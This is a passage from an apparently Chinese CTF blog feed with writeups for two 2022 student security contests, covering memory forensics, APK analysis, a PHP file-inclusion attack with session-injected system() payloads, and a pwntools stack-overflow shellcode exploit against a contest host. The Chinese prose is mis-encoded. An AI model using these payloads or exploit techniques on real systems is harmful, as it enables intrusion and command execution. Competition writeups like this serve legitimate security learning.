src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205130243.png" alt="image-20220709205130243"></p><p>å¯ä»¥ç›´æ¥çœ‹åˆ°åˆ†è¾¨ç‡360x360</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205121443.png" alt="image-20220709205121443"></p><h3 id="2-æ‰‹æœºå–è¯2"><a href="#2-æ‰‹æœºå–è¯2" class="headerlink" title="2. æ‰‹æœºå–è¯2"></a>2. æ‰‹æœºå–è¯2</h3><p>æœç´¢å§œæ€»å…³é”®å­—</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205115357.png" alt="image-20220709205115357"></p><p>åœ¨ç¾¤ç»„èŠå¤©é‡Œæ‰¾åˆ°å¿«é€’å•å·</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205108371.png" alt="image-20220709205108371"></p><h3 id="3-è®¡ç®—æœºå–è¯1"><a href="#3-è®¡ç®—æœºå–è¯1" class="headerlink" title="3. è®¡ç®—æœºå–è¯1"></a>3. è®¡ç®—æœºå–è¯1</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp imageinfo</code></p><p>ç³»ç»Ÿç‰ˆæœ¬ä¸ºWin7SP1x64</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205102750.png" alt="image-20220709205102750"></p><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 hashdump</code></p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205056605.png" alt="image-20220709205056605"></p><p>æ‹¿åˆ°<a href="https://www.somd5.com/">https://www.somd5.com/</a> ç½‘ç«™è§£å¯†å¾—åˆ°taqi7çš„å¼€æœºå¯†ç </p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205049358.png" alt="image-20220709205049358"></p><h3 id="4-è®¡ç®—æœºå–è¯2"><a href="#4-è®¡ç®—æœºå–è¯2" class="headerlink" title="4. è®¡ç®—æœºå–è¯2"></a>4. è®¡ç®—æœºå–è¯2</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 cmdline</code></p><p>pidä¸º2192çš„è¿è¡Œäº†MagnetRAMCapture.exe</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205035986.png" alt="image-20220709205035986"></p><p>è¿™æ˜¯ä¸€æ¬¾åˆ¶ä½œå†…å­˜é•œåƒçš„å·¥å…·</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205029581.png" alt="image-20220709205029581"></p><h3 id="5-ç¨‹åºåˆ†æ-1"><a href="#5-ç¨‹åºåˆ†æ-1" class="headerlink" title="5. ç¨‹åºåˆ†æ_1"></a>5. ç¨‹åºåˆ†æ_1</h3><p>å°†apkåŒ…åç¼–è¯‘åï¼Œæ‰“å¼€<code>AndroidManifest.xml</code>ï¼Œæœç´¢packageè·å–åŒ…å</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205014408.png" alt="image-20220709205014408"></p><h3 id="6-ç¨‹åºåˆ†æ-2"><a href="#6-ç¨‹åºåˆ†æ-2" class="headerlink" title="6. ç¨‹åºåˆ†æ_2"></a>6. ç¨‹åºåˆ†æ_2</h3><p>æŸ¥æ‰¾android.intent.action.MAINå’Œandroid.intent.category.LAUNCHERå¯¹åº”çš„activityï¼Œè¯¥activityå¯¹åº”çš„android:nameå±æ€§å³ä¸ºå…¥å£</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205008184.png" alt="image-20220709205008184"></p><h3 id="7-ç¨‹åºåˆ†æ-3"><a href="#7-ç¨‹åºåˆ†æ-3" class="headerlink" title="7. ç¨‹åºåˆ†æ_3"></a>7. ç¨‹åºåˆ†æ_3</h3><p>.æ‰¾åˆ°MainActivity<br> <img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204948195.png" alt="image-20220709204948195"></p><p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6è¿›è¡Œbase64è§£ç </p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image003.png" alt="img"></p><h3 id="8-ç½‘ç«™å–è¯-1"><a href="#8-ç½‘ç«™å–è¯-1" class="headerlink" title="8. ç½‘ç«™å–è¯_1"></a>8. ç½‘ç«™å–è¯_1</h3><p>ä½¿ç”¨ç«ç»’æŸ¥æ€æ‰¾åˆ°ç½‘ç«™åé—¨</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204453376.png" alt="image-20220709204453376"></p><p>æ‰“å¼€çœ‹åˆ°è¿æ¥å¯†ç </p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204501928.png" alt="image-20220709204501928"></p><h3 id="9-ç½‘ç«™å–è¯-2"><a href="#9-ç½‘ç«™å–è¯-2" class="headerlink" title="9. ç½‘ç«™å–è¯_2"></a>9. ç½‘ç«™å–è¯_2</h3><p>database.phpä¸­å¯ä»¥æ‰¾åˆ°passwordè°ƒç”¨äº†<code>my_encrypt()</code>å‡½æ•°</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204520285.png" alt="image-20220709204520285"></p><p>è·Ÿè¿›<code>my_encrypt()</code>å‡½æ•°</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204530241.png" alt="image-20220709204530241"></p><p>æœ¬åœ°è·‘ä¸€ä¸‹å¾—åˆ°å¯†ç </p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204539502.png" alt="image-20220709204539502"></p><h3 id="10-ç½‘ç«™å–è¯-3"><a href="#10-ç½‘ç«™å–è¯-3" class="headerlink" title="10. ç½‘ç«™å–è¯_3"></a>10. ç½‘ç«™å–è¯_3</h3><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204858323.png" alt="image-20220709204858323"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬å…­å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åˆèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šå¹¿ä¸œçœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æ”»é˜²å¤§èµ›åˆèµ›Writeup</title>
      <link href="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-ctf"><a href="#easy-ctf" class="headerlink" title="easy_ctf"></a>easy_ctf</h2><p>è®¿é—®é¡µé¢ï¼Œå‘ç°æ˜¯ä¸ªè„šæœ¬é¢˜ã€‚ä½†æ˜¯è¿™é‡Œçš„å­—ç¬¦æ¯æ¬¡éƒ½ä¼šå˜ï¼Œæ‰€ä»¥éœ€è¦ä¿æŒåŒä¸€ä¼šè¯ç®¡ç†ã€‚</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image002.jpg" alt="img"></p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># @author : Tao. </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span> </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.191.238:43304/&quot;</span> </span><br><span class="line"></span><br><span class="line">sess = requests.session() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req = sess.get(url) </span><br><span class="line">code = re.findall(<span class="string">r&#x27;(.*)&lt;td&gt;&#x27;</span>,req.text)[<span class="number">0</span>] </span><br><span class="line">code = <span class="string">&quot;&quot;</span>.join(<span class="built_in">sorted</span>(code)) </span><br><span class="line"></span><br><span class="line">result = &#123;&#125; </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet: </span><br><span class="line">  counts = code.count(i) </span><br><span class="line">  i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i) </span><br><span class="line">  result[i] = counts </span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> res: </span><br><span class="line">  <span class="keyword">if</span> k[<span class="number">1</span>] != <span class="number">0</span>: </span><br><span class="line">    s += k[<span class="number">0</span>] * <span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s) </span><br><span class="line">data = &#123; </span><br><span class="line">  <span class="string">&#x27;ans&#x27;</span>: s, </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">headers = &#123; </span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line">res = sess.post(url, headers=headers, data=data) </span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œç›´æ¥å‡ºflagï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image004.jpg" alt="img"></p><h2 id="Web-in"><a href="#Web-in" class="headerlink" title="Web | in"></a>Web | in</h2><p>è¾“å…¥å­—ç¬¦ä¸²ï¼Œè·³è½¬ç‚¹å‡»é“¾æ¥ï¼Œå‘ç°æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image006.png" alt="img"></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image008.png" alt="img"></p><p>åˆ©ç”¨<code>php://filter</code>åè®®è¯»å–actionå†…å®¹</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image010.png" alt="img"></p><p>è§£å‹Base64å¾—åˆ°æºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"> <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$name</span>)&#123; </span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$name</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line"> <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ€è·¯è½¬åˆ°SESSIONæ–‡ä»¶åŒ…å«ï¼Œfuzzå¸¸è§è·¯åŠ²</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image012.png" alt="img"></p><p>æ¥ç€å°è¯•åŒ…å«æ–‡ä»¶è¾¾åˆ°å‘½ä»¤æ‰§è¡Œï¼Œå¾—flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="meta">&lt;?php</span>+<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls+/&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line">name=<span class="meta">&lt;?php</span>+<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat+/fl444444444g&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image014.png" alt="img"></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image016.png" alt="img"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Jmp-rsp"><a href="#Jmp-rsp" class="headerlink" title="Jmp_rsp"></a>Jmp_rsp</h2><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image017.png" alt="img"></p><p>å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†å› ä¸ºç¨‹åºæ˜¯é™æ€ç¼–è¯‘è€Œä¸”åªèƒ½æº¢å‡º<code>0x20</code>ä¸èƒ½ç›´æ¥<code>ret2libc</code>ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†å¾€bsså†™å…¥shellcodeï¼Œåˆ©ç”¨mainå‡½æ•°retå‰åˆšè°ƒç”¨çš„readçš„ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œåªä¿®æ”¹rsiï¼Œè®¾ç½®ä¸º0x6BB300è¿™ä¸ªbssæ®µåœ°å€ï¼Œç„¶åè°ƒç”¨readå†™å…¥shellcodeè¿”å›mainï¼Œå†æ¬¡è¦†ç›–è¿”å›åœ°å€ä¸ºbssåœ°å€</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image018.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher </span><br><span class="line"> </span><br><span class="line"> context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> p = remote(<span class="string">&#x27;47.106.122.102&#x27;</span>,<span class="number">46577</span>) </span><br><span class="line"> \<span class="comment">#p = process(&#x27;jmp_rsp&#x27;) </span></span><br><span class="line"> elf = ELF(<span class="string">&#x27;jmp_rsp&#x27;</span>) </span><br><span class="line"> main = <span class="number">0x400B5D</span> </span><br><span class="line"> pop_rdi_ret = <span class="number">0x0000000000400696</span> </span><br><span class="line"> pop_rsi_ret = <span class="number">0x0000000000410173</span> </span><br><span class="line"> leave = <span class="number">0x0000000000400B91</span> </span><br><span class="line"> bss = <span class="number">0x6BB300</span> </span><br><span class="line"> read = <span class="number">0x0449380</span> </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#gdb.attach(p,&#x27;b *0x400B91&#x27;) </span></span><br><span class="line"> payload = asm(shellcraft.sh()).ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(pop_rsi_ret) + p64(bss) + p64(read) + p64(main) </span><br><span class="line"> p.sendline(payload) </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#write shellcode to bss </span></span><br><span class="line"> pause() </span><br><span class="line"> p.sendline(asm(shellcraft.sh())) </span><br><span class="line"> </span><br><span class="line"> \<span class="comment">#ret2bss </span></span><br><span class="line"> payload = asm(shellcraft.sh()).ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">0x8</span>) + p64(bss) + p64(main) </span><br><span class="line"> p.sendline(payload) </span><br><span class="line"> p.interactive() </span><br><span class="line"> p.close()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Pyre"><a href="#Pyre" class="headerlink" title="Pyre"></a>Pyre</h2><p>å‘ç°æ˜¯Pythonæ‰“åŒ…çš„exeç¨‹åºï¼ŒçŒœæµ‹æ˜¯ä½¿ç”¨pyinstallerè¿›è¡Œæ‰“åŒ…çš„ï¼Œä½¿ç”¨å¼€æºé¡¹ç›®<a href="https://github.com/extremecoders-re/pyinstxtractor%E6%8F%90%E5%8F%96%E5%87%BApyc%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E4%BD%BF%E7%94%A8pyc%E5%8F%8D%E7%BC%96%E8%AF%91%E5%9B%9EPython%E6%BA%90%E4%BB%A3%E7%A0%81">https://github.com/extremecoders-re/pyinstxtractoræå–å‡ºpycæ–‡ä»¶ï¼Œç„¶åå†ä½¿ç”¨pycåç¼–è¯‘å›Pythonæºä»£ç </a></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image019.png" alt="img"></p><p>ä½¿ç”¨åœ¨çº¿ç½‘ç«™<a href="https://www.toolnb.com/tools-lang-en/pyc.html">https://www.toolnb.com/tools-lang-en/pyc.html</a> å¯¹1.pycè¿›è¡Œåç¼–è¯‘</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image020.jpg" alt="img"></p><p>å‘ç°æœ‰ä¸€äº›ç®€å•çš„è®¡ç®—æ¥åŠ å¯†flagï¼Œç›´æ¥ç”¨asciiå¯è§å­—ç¬¦èŒƒå›´æ¥æš´åŠ›çŒœæµ‹flag</p><p><img 